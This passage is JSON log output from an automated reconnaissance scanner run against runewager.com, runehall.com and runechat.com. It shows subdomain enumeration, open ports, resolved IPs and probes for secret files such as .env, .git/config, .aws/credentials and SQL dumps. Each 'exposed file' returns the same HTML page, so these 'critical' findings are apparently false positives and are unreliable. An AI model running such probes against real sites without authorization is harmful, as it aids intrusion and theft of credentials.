      {
        "time": "22:03:12",
        "level": "debug",
        "message": "HTTP 404 from https://test.runechat.com"
      }
    ]
  },
  "api.runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: api.runechat.com"
      }
    ]
  },
  "staging.runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: staging.runechat.com"
      }
    ]
  },
  "runewager.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Checking Cloudflare origin for runewager.com"
      },
      {
        "time": "22:01:27",
        "level": "info",
        "message": "Scanning S3 buckets for runewager.com"
      },
      {
        "time": "22:01:27",
        "level": "info",
        "message": "Scanning ports for runewager.com"
      },
      {
        "time": "22:01:31",
        "level": "debug",
        "message": "Resolved to IP: 3.163.80.42"
      },
      {
        "time": "22:01:31",
        "level": "success",
        "message": "Port 80 OPEN"
      },
      {
        "time": "22:01:31",
        "level": "success",
        "message": "Port 443 OPEN"
      },
      {
        "time": "22:01:32",
        "level": "warning",
        "message": "No historical IPs found"
      },
      {
        "time": "22:01:32",
        "level": "info",
        "message": "Scanning subdomain: runewager.com"
      },
      {
        "time": "22:01:33",
        "level": "success",
        "message": "Web server active: http://runewager.com (301)"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "Testing WebSocket on wss.runewager.com"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "Testing Redis access on runewager.com"
      },
      {
        "time": "22:03:48",
        "level": "success",
        "message": "Web server active: https://runewager.com (301)"
      },
      {
        "time": "22:04:19",
        "level": "debug",
        "message": "Testing WebSocket on wss.runewager.com"
      },
      {
        "time": "22:04:19",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:19",
        "level": "debug",
        "message": "Testing Redis access on runewager.com"
      }
    ]
  },
  "admin.runewager.com": {
    "findings": [
      {
        "time": "22:01:27",
        "level": "info",
        "message": "Scanning subdomain: admin.runewager.com"
      },
      {
        "time": "22:01:32",
        "level": "success",
        "message": "Web server active: http://admin.runewager.com (200)"
      },
      {
        "time": "22:02:43",
        "level": "debug",
        "message": "Testing WebSocket on wss.admin.runewager.com"
      },
      {
        "time": "22:02:43",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:43",
        "level": "debug",
        "message": "Testing Redis access on admin.runewager.com"
      },
      {
        "time": "22:03:40",
        "level": "warning",
        "message": "Admin subdomain detected - running enhanced checks"
      },
      {
        "time": "22:03:53",
        "level": "success",
        "message": "Web server active: https://admin.runewager.com (200)"
      },
      {
        "time": "22:04:17",
        "level": "debug",
        "message": "Testing WebSocket on wss.admin.runewager.com"
      },
      {
        "time": "22:04:17",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:17",
        "level": "debug",
        "message": "Testing Redis access on admin.runewager.com"
      },
      {
        "time": "22:05:11",
        "level": "warning",
        "message": "Admin subdomain detected - running enhanced checks"
      }
    ]
  },
  "api.runewager.com": {
    "findings": [
      {
        "time": "22:01:27",
        "level": "info",
        "message": "Scanning subdomain: api.runewager.com"
      },
      {
        "time": "22:01:32",
        "level": "debug",
        "message": "HTTP 404 from http://api.runewager.com"
      },
      {
        "time": "22:01:33",
        "level": "debug",
        "message": "HTTP 404 from https://api.runewager.com"
      }
    ]
  },
  "staging.runewager.com": {
    "findings": [
      {
        "time": "22:01:30",
        "level": "info",
        "message": "Scanning subdomain: staging.runewager.com"
      },
      {
        "time": "22:01:33",
        "level": "success",
        "message": "Web server active: http://staging.runewager.com (301)"
      },
      {
        "time": "22:03:02",
        "level": "debug",
        "message": "Testing WebSocket on wss.staging.runewager.com"
      },
      {
        "time": "22:03:02",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:02",
        "level": "debug",
        "message": "Testing Redis access on staging.runewager.com"
      },
      {
        "time": "22:03:09",
        "level": "success",
        "message": "Web server active: https://staging.runewager.com (200)"
      },
      {
        "time": "22:04:00",
        "level": "debug",
        "message": "Testing WebSocket on wss.staging.runewager.com"
      },
      {
        "time": "22:04:00",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:00",
        "level": "debug",
        "message": "Testing Redis access on staging.runewager.com"
      }
    ]
  },
  "support.runewager.com": {
    "findings": [
      {
        "time": "22:01:32",
        "level": "info",
        "message": "Scanning subdomain: support.runewager.com"
      },
      {
        "time": "22:01:33",
        "level": "success",
        "message": "Web server active: http://support.runewager.com (301)"
      },
      {
        "time": "22:03:00",
        "level": "debug",
        "message": "Testing WebSocket on wss.support.runewager.com"
      },
      {
        "time": "22:03:00",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:00",
        "level": "debug",
        "message": "Testing Redis access on support.runewager.com"
      },
      {
        "time": "22:03:03",
        "level": "success",
        "message": "Web server active: https://support.runewager.com (301)"
      },
      {
        "time": "22:03:39",
        "level": "debug",
        "message": "Testing WebSocket on wss.support.runewager.com"
      },
      {
        "time": "22:03:39",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:39",
        "level": "debug",
        "message": "Testing Redis access on support.runewager.com"
      }
    ]
  },
  "discord.runewager.com": {
    "findings": [
      {
        "time": "22:01:32",
        "level": "info",
        "message": "Scanning subdomain: discord.runewager.com"
      },
      {
        "time": "22:01:33",
        "level": "success",
        "message": "Web server active: http://discord.runewager.com (301)"
      },
      {
        "time": "22:02:46",
        "level": "debug",
        "message": "Testing WebSocket on wss.discord.runewager.com"
      },
      {
        "time": "22:02:46",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:46",
        "level": "debug",
        "message": "Testing Redis access on discord.runewager.com"
      },
      {
        "time": "22:03:41",
        "level": "success",
        "message": "Web server active: https://discord.runewager.com (200)"
      },
      {
        "time": "22:04:06",
        "level": "debug",
        "message": "Testing WebSocket on wss.discord.runewager.com"
      },
      {
        "time": "22:04:06",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:06",
        "level": "debug",
        "message": "Testing Redis access on discord.runewager.com"
      }
    ]
  },
  "www.discord.runewager.com": {
    "findings": [
      {
        "time": "22:01:32",
        "level": "info",
        "message": "Scanning subdomain: www.discord.runewager.com"
      },
      {
        "time": "22:01:33",
        "level": "success",
        "message": "Web server active: http://www.discord.runewager.com (301)"
      },
      {
        "time": "22:02:44",
        "level": "debug",
        "message": "Testing WebSocket on wss.www.discord.runewager.com"
      },
      {
        "time": "22:02:44",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:44",
        "level": "debug",
        "message": "Testing Redis access on www.discord.runewager.com"
      },
      {
        "time": "22:03:36",
        "level": "success",
        "message": "Web server active: https://www.discord.runewager.com (200)"
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "Testing WebSocket on wss.www.discord.runewager.com"
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "Testing Redis access on www.discord.runewager.com"
      }
    ]
  },
  "runehall.com": {
    "findings": [
      {
        "time": "22:01:33",
        "level": "info",
        "message": "Checking Cloudflare origin for runehall.com"
      },
      {
        "time": "22:01:33",
        "level": "info",
        "message": "Scanning S3 buckets for runehall.com"
      },
      {
        "time": "22:01:33",
        "level": "warning",
        "message": "No historical IPs found"
      },
      {
        "time": "22:01:33",
        "level": "info",
        "message": "Scanning ports for runehall.com"
      },
      {
        "time": "22:01:36",
        "level": "debug",
        "message": "Resolved to IP: 104.26.9.187"
      },
      {
        "time": "22:01:36",
        "level": "success",
        "message": "Port 80 OPEN"
      },
      {
        "time": "22:01:36",
        "level": "success",
        "message": "Port 443 OPEN"
      },
      {
        "time": "22:01:36",
        "level": "success",
        "message": "Port 8080 OPEN"
      },
      {
        "time": "22:01:36",
        "level": "success",
        "message": "Port 8443 OPEN"
      },
      {
        "time": "22:03:14",
        "level": "info",
        "message": "Scanning subdomain: runehall.com"
      },
      {
        "time": "22:03:15",
        "level": "success",
        "message": "Web server active: http://runehall.com (301)"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "Testing WebSocket on wss.runehall.com"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "Testing Redis access on runehall.com"
      },
      {
        "time": "22:04:14",
        "level": "success",
        "message": "Web server active: https://runehall.com (200)"
      },
      {
        "time": "22:04:29",
        "level": "debug",
        "message": "Testing WebSocket on wss.runehall.com"
      },
      {
        "time": "22:04:29",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:29",
        "level": "debug",
        "message": "Testing Redis access on runehall.com"
      }
    ]
  },
  "http://admin.runewager.com": {
    "findings": [
      {
        "time": "22:01:33",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/.env"
      },
      {
        "time": "22:01:33",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:33",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/.git/config"
      },
      {
        "time": "22:01:33",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:36",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/.svn/entries"
      },
      {
        "time": "22:01:36",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:37",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/.htaccess"
      },
      {
        "time": "22:01:37",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:38",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/web.config"
      },
      {
        "time": "22:01:38",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:40",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/robots.txt"
      },
      {
        "time": "22:01:40",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:44",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/sitemap.xml"
      },
      {
        "time": "22:01:44",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:46",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/crossdomain.xml"
      },
      {
        "time": "22:01:46",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:46",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/phpinfo.php"
      },
      {
        "time": "22:01:46",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:48",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/wp-config.php"
      },
      {
        "time": "22:01:48",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:50",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/config.php"
      },
      {
        "time": "22:01:50",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:52",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/config.json"
      },
      {
        "time": "22:01:52",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:54",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/credentials.json"
      },
      {
        "time": "22:01:54",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:56",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/docker-compose.yml"
      },
      {
        "time": "22:01:56",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:57",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/traefik.yml"
      },
      {
        "time": "22:01:57",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:58",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/admin"
      },
      {
        "time": "22:01:58",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:58",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/backup"
      },
      {
        "time": "22:01:58",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:01:59",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/sql"
      },
      {
        "time": "22:01:59",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:02:00",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/db.sql"
      },
      {
        "time": "22:02:00",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:02:02",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/dump.sql"
      },
      {
        "time": "22:02:02",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:02:04",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/backup.zip"
      },
      {
        "time": "22:02:04",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:02:05",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: http://admin.runewager.com/.aws/credentials"
      },
      {
        "time": "22:02:05",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"shortcut icon\" href=\"/favicon.ico\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,shrink-to-fit=no\"/><meta na..."
      },
      {
        "time": "22:02:05",
        "level": "debug",
        "message": "Testing API endpoints on http://admin.runewager.com"
      },
      {
        "time": "22:02:05",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/api/v1/user (200)"
      },
      {
        "time": "22:02:15",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/api/v1/admin (200)"
      },
      {
        "time": "22:02:16",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/api/v1/config (200)"
      },
      {
        "time": "22:02:16",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/graphql (200)"
      },
      {
        "time": "22:02:21",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/rest/v1/users (200)"
      },
      {
        "time": "22:02:36",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/oauth/token (200)"
      },
      {
        "time": "22:02:38",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/v2/api-docs (200)"
      },
      {
        "time": "22:02:38",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/swagger-ui.html (200)"
      },
      {
        "time": "22:02:38",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:42",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/swagger.json (200)"
      },
      {
        "time": "22:02:42",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:43",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/actuator (200)"
      },
      {
        "time": "22:02:43",
        "level": "warning",
        "message": "API endpoint exposed: http://admin.runewager.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "api.runehall.com": {
    "findings": [
      {
        "time": "22:01:37",
        "level": "info",
        "message": "Scanning subdomain: api.runehall.com"
      },
      {
        "time": "22:01:39",
        "level": "success",
        "message": "Web server active: http://api.runehall.com (403)"
      },
      {
        "time": "22:02:40",
        "level": "debug",
        "message": "Testing WebSocket on wss.api.runehall.com"
      },
      {
        "time": "22:02:40",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:40",
        "level": "debug",
        "message": "Testing Redis access on api.runehall.com"
      },
      {
        "time": "22:02:50",
        "level": "warning",
        "message": "API subdomain detected - running enhanced checks"
      },
      {
        "time": "22:02:51",
        "level": "success",
        "message": "Web server active: https://api.runehall.com (403)"
      },
      {
        "time": "22:03:27",
        "level": "debug",
        "message": "Testing WebSocket on wss.api.runehall.com"
      },
      {
        "time": "22:03:27",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:27",
        "level": "debug",
        "message": "Testing Redis access on api.runehall.com"
      },
      {
        "time": "22:03:36",
        "level": "warning",
        "message": "API subdomain detected - running enhanced checks"
      }
    ]
  },
  "sockets.runehall.com": {
    "findings": [
      {
        "time": "22:01:38",
        "level": "info",
        "message": "Scanning subdomain: sockets.runehall.com"
      },
      {
        "time": "22:01:41",
        "level": "success",
        "message": "Web server active: http://sockets.runehall.com (301)"
      },
      {
        "time": "22:02:49",
        "level": "debug",
        "message": "Testing WebSocket on wss.sockets.runehall.com"
      },
      {
        "time": "22:02:49",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:49",
        "level": "debug",
        "message": "Testing Redis access on sockets.runehall.com"
      },
      {
        "time": "22:02:58",
        "level": "success",
        "message": "Web server active: https://sockets.runehall.com (200)"
      },
      {
        "time": "22:03:50",
        "level": "debug",
        "message": "Testing WebSocket on wss.sockets.runehall.com"
      },
      {
        "time": "22:03:50",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:50",
        "level": "debug",
        "message": "Testing Redis access on sockets.runehall.com"
      }
    ]
  },
  "wss.runehall.com": {
    "findings": [
      {
        "time": "22:01:41",
        "level": "info",
        "message": "Scanning subdomain: wss.runehall.com"
      },
      {
        "time": "22:01:45",
        "level": "success",
        "message": "Web server active: http://wss.runehall.com (301)"
      },
      {
        "time": "22:02:59",
        "level": "debug",
        "message": "Testing WebSocket on wss.wss.runehall.com"
      },
      {
        "time": "22:02:59",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:59",
        "level": "debug",
        "message": "Testing Redis access on wss.runehall.com"
      },
      {
        "time": "22:03:08",
        "level": "success",
        "message": "Web server active: https://wss.runehall.com (200)"
      },
      {
        "time": "22:04:00",
        "level": "debug",
        "message": "Testing WebSocket on wss.wss.runehall.com"
      },
      {
        "time": "22:04:00",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:00",
        "level": "debug",
        "message": "Testing Redis access on wss.runehall.com"
      }
    ]
  },
  "420.runehall.com": {
    "findings": [
      {
        "time": "22:01:41",
        "level": "info",
        "message": "Scanning subdomain: 420.runehall.com"
      },
      {
        "time": "22:01:45",
        "level": "success",
        "message": "Web server active: http://420.runehall.com (301)"
      },
      {
        "time": "22:02:56",
        "level": "debug",
        "message": "Testing WebSocket on wss.420.runehall.com"
      },
      {
        "time": "22:02:56",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:56",
        "level": "debug",
        "message": "Testing Redis access on 420.runehall.com"
      },
      {
        "time": "22:03:07",
        "level": "debug",
        "message": "HTTP 521 from https://420.runehall.com"
      }
    ]
  },
  "69.runehall.com": {
    "findings": [
      {
        "time": "22:01:57",
        "level": "info",
        "message": "Scanning subdomain: 69.runehall.com"
      },
      {
        "time": "22:01:58",
        "level": "success",
        "message": "Web server active: http://69.runehall.com (301)"
      },
      {
        "time": "22:03:05",
        "level": "debug",
        "message": "Testing WebSocket on wss.69.runehall.com"
      },
      {
        "time": "22:03:05",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:05",
        "level": "debug",
        "message": "Testing Redis access on 69.runehall.com"
      },
      {
        "time": "22:03:14",
        "level": "debug",
        "message": "HTTP 530 from https://69.runehall.com"
      }
    ]
  },
  "blog.runehall.com": {
    "findings": [
      {
        "time": "22:01:57",
        "level": "info",
        "message": "Scanning subdomain: blog.runehall.com"
      },
      {
        "time": "22:01:58",
        "level": "success",
        "message": "Web server active: http://blog.runehall.com (301)"
      },
      {
        "time": "22:03:08",
        "level": "debug",
        "message": "Testing WebSocket on wss.blog.runehall.com"
      },
      {
        "time": "22:03:08",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:08",
        "level": "debug",
        "message": "Testing Redis access on blog.runehall.com"
      },
      {
        "time": "22:03:19",
        "level": "success",
        "message": "Web server active: https://blog.runehall.com (200)"
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "Testing WebSocket on wss.blog.runehall.com"
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:56",
        "level": "debug",
        "message": "Testing Redis access on blog.runehall.com"
      }
    ]
  },
  "cdn.runehall.com": {
    "findings": [
      {
        "time": "22:01:59",
        "level": "info",
        "message": "Scanning subdomain: cdn.runehall.com"
      },
      {
        "time": "22:02:00",
        "level": "success",
        "message": "Web server active: http://cdn.runehall.com (301)"
      },
      {
        "time": "22:03:05",
        "level": "debug",
        "message": "Testing WebSocket on wss.cdn.runehall.com"
      },
      {
        "time": "22:03:05",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:05",
        "level": "debug",
        "message": "Testing Redis access on cdn.runehall.com"
      },
      {
        "time": "22:03:18",
        "level": "debug",
        "message": "HTTP 404 from https://cdn.runehall.com"
      }
    ]
  },
  "http://www.discord.runewager.com": {
    "findings": [
      {
        "time": "22:02:05",
        "level": "debug",
        "message": "Testing API endpoints on http://www.discord.runewager.com"
      },
      {
        "time": "22:02:06",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/api/v1/user (301)"
      },
      {
        "time": "22:02:16",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:19",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/api/v1/config (301)"
      },
      {
        "time": "22:02:19",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/graphql (301)"
      },
      {
        "time": "22:02:24",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:30",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/oauth/token (301)"
      },
      {
        "time": "22:02:33",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:34",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:34",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:40",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/swagger.json (301)"
      },
      {
        "time": "22:02:40",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:40",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/actuator (301)"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://www.discord.runewager.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://test.runechat.com": {
    "findings": [
      {
